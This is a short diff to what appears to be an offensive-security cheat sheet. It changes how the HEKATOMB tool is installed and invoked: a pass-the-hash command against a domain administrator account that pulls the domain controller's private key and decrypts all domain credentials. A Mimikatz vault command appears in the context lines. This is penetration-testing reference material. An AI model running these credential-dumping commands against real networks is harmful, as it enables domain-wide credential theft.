@@ -245,12 +245,13 @@ vault::cred /in:C:\Users\demo\AppData\Local\Microsoft\Vault\"
 > Finally, it will extract domain controller private key through RPC uses it to decrypt all credentials.
 
 ```python
-python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp
+pip3 install hekatomb
+hekatomb -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp
 ```
 
 <a href="https://github.com/Processus-Thief/HEKATOMB">https://github.com/Processus-Thief/HEKATOMB</a>
 
-![Data in memory](https://docs.lestutosdeprocessus.fr/hekatomb.png)
+![Data in memory](https://github.com/Processus-Thief/HEKATOMB/raw/main/.assets/github1.png)
 
 
 ## Mimikatz - Commands list
